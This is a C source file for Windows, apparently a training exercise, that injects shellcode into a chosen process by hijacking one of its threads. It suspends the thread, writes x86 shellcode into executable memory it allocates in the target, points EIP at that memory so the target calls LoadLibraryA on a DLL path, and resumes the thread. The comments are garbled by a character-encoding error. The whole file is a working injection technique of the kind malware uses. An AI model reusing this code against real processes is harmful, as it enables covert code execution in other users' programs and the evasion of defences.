#include <stdio.h>
#include <Windows.h>
#include <tchar.h>
#include "ProcessOperation.h"

DWORD g_dwThreadID = 0;
bool injectShellcode(DWORD dwPid,  BYTE* pShellCode, DWORD dwSize);
bool EnumThreadProc(IN  void *callBackParameter, IN THREADENTRY32* pThreadEntry);

int _tmain(int argc, _TCHAR* argv[])
{
	BYTE shellcode[] =
	{
		"\x68\x00\x00\x00\x00"	// push ����ֵ
		"\xE8\x00\x00\x00\x00"	// call $+5
		"\x58"					// pop	eax
		"\x83\xC0\x0d"			// add eax,0xD
		"\x50"					// push eax
		"\xB8\x30\x88\x20\x74"	// mov eax,LoadLibraryA
		"\xFF\xD0"				// call eax
		"\xC3"			// ret 0x04
		"F:\\15pb��ϰ\\Windowsƽ̨\\Debug\\001����ע��Ķ�̬��.dll" 
	};


	DWORD	dwPid;
	printf("����Ҫע�뵽�Ľ���PID:");
	scanf_s("%d[*]", &dwPid);

	// ע����ƺõ�shellcode
	injectShellcode(dwPid, shellcode, sizeof(shellcode));

	return 0;
}

bool injectShellcode(DWORD dwPid,  BYTE* pShellCode, DWORD dwSize)
{

	bool	bRet = false;
	HANDLE	hProcess = NULL;
	LPVOID	pRemoteBuff = NULL;
	DWORD	dwWrite = 0;
	HANDLE hThread = NULL;
	CONTEXT threadContext = { 0 };

	//1. ö���ҳ������е��߳�
	EnumThread(EnumThreadProc, &dwPid);
	if (0 == g_dwThreadID)
	{
		printf("û���ҵ�ָ�����̵��߳�\n");
		goto _EXIT;
	}

	//2. ���߳�
	hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, g_dwThreadID);
	if (NULL == hThread)
	{
		printf("���߳�ʧ��\n");
		goto _EXIT;
	}

	//3.�����߳�
	SuspendThread(hThread);
	
	//4. ��ȡ�̻߳���
	threadContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(hThread, &threadContext);

	// 5. �򿪽���
	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		dwPid /*����ID*/
		);
	if (NULL == hProcess)
	{
		printf("�򿪽���ʧ��,�������ڱ������Ȩ��̫��,���Թ���Ա��������ٳ���\n");
		goto _EXIT;
	}

	//6. ����shellcode
	*(DWORD*)(pShellCode + 1) = threadContext.Eip;
	// ��MessageBoxA�����ĵ�ַд�뵽shellcode��.
	*(DWORD*)(pShellCode + 16) = (DWORD)&LoadLibraryA;


	// 6. ��Զ�̽����Ͽ����ڴ�ռ�
	pRemoteBuff = VirtualAllocEx(
		hProcess,
		NULL,
		64 * 1024, /*��С:64Kb*/
		MEM_COMMIT,/*Ԥ�����ύ*/
		PAGE_EXECUTE_READWRITE/*�ɶ���д��ִ�е�����*/
		);
	if (pRemoteBuff == NULL)
	{
		printf("��Զ�̽����Ͽ��ٿս�ʧ��\n");
		goto _EXIT;
	}

	// 7. ��shellcodeд��
	WriteProcessMemory(
		hProcess,
		pRemoteBuff,			  /* Ҫд��ĵ�ַ */
		pShellCode,		      /* Ҫд������ݵĵ�ַ */
		dwSize,				  /* д����ֽ��� */
		&dwWrite				  /* ���:����ʵ��д����ֽ��� */
		);
	if (dwWrite != dwSize) 
	{
		printf("д��shellcodeʧ��\n");
		goto _EXIT;
	}

	//8. ��eip����Ϊshellcode  
	threadContext.Eip = (DWORD)pRemoteBuff;
	SetThreadContext(hThread, &threadContext);

	//9. �ָ��߳�
	ResumeThread(hThread);

	bRet = true;


_EXIT:
	// �ͷ�Զ�̽��̵��ڴ�
	//VirtualFreeEx(hProcess, pRemoteBuff, 0, MEM_RELEASE);
	// �رս��̾��
	CloseHandle(hProcess);
	//�ر��߳̾��
	CloseHandle(hThread);

	return bRet;


}

bool EnumThreadProc(IN  void *callBackParameter, IN THREADENTRY32* pThreadEntry)
{
	DWORD dwOwnerProcessID = (DWORD)(*(DWORD*)callBackParameter);
	if (pThreadEntry->th32OwnerProcessID == dwOwnerProcessID)
	{
		g_dwThreadID = pThreadEntry->th32ThreadID;
		return true;
	}
	return false;
}

